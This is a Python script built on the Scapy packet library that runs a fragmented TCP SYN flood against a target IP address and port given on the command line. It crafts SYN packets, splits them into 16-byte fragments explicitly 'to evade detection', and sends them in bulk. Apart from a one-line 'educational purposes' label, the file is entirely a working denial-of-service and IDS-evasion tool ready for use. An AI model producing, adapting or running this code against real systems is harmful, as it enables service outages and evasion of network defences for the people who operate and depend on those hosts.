#!/usr/bin/env python3
from scapy.all import IP, TCP, send, fragment, RandShort
import time
import argparse
from typing import List
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class FragmentationAttack:
    def __init__(self, target_ip: str, target_port: int = 80):
        """
        Initialize the fragmentation attack parameters
        
        Args:
            target_ip (str): Target machine IP address
            target_port (int): Target port number (default: 80)
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.fragment_size = 16  # Small fragments to evade detection
        
    def craft_syn_packet(self) -> IP:
        """
        Craft a single SYN packet
        
        Returns:
            IP: Scapy IP packet with TCP SYN flag
        """
        ip_packet = IP(dst=self.target_ip)
        tcp_packet = TCP(
            sport=RandShort(),
            dport=self.target_port,
            flags='S',  # SYN flag
            seq=RandShort(),
            window=RandShort()
        )
        return ip_packet/tcp_packet
    
    def fragment_and_send(self, packet: IP, count: int = 1) -> None:
        """
        Fragment and send the packet
        
        Args:
            packet (IP): The packet to fragment and send
            count (int): Number of times to send the fragmented packet
        """
        # Fragment the packet
        frags = fragment(packet, fragsize=self.fragment_size)
        
        # Send each fragment
        for _ in range(count):
            for frag in frags:
                try:
                    send(frag, verbose=False)
                    time.sleep(0.01)  # Small delay between fragments
                except Exception as e:
                    logging.error(f"Error sending fragment: {e}")
                    
    def launch_attack(self, packet_count: int = 100) -> None:
        """
        Launch the fragmentation attack
        
        Args:
            packet_count (int): Number of packets to send
        """
        logging.info(f"Starting fragmentation attack against {self.target_ip}:{self.target_port}")
        
        try:
            syn_packet = self.craft_syn_packet()
            logging.info("Sending fragmented SYN packets...")
            self.fragment_and_send(syn_packet, packet_count)
            logging.info("Attack completed")
            
        except KeyboardInterrupt:
            logging.info("Attack interrupted by user")
        except Exception as e:
            logging.error(f"Attack failed: {e}")

def main():
    parser = argparse.ArgumentParser(
        description='Fragmentation-based SYN flood attack for educational purposes'
    )
    parser.add_argument(
        'target_ip',
        help='Target IP address'
    )
    parser.add_argument(
        '-p', '--port',
        type=int,
        default=80,
        help='Target port (default: 80)'
    )
    parser.add_argument(
        '-c', '--count',
        type=int,
        default=100,
        help='Number of packets to send (default: 100)'
    )
    
    args = parser.parse_args()
    
    # Create and launch attack
    attack = FragmentationAttack(args.target_ip, args.port)
    attack.launch_attack(args.count)

if __name__ == "__main__":
    main()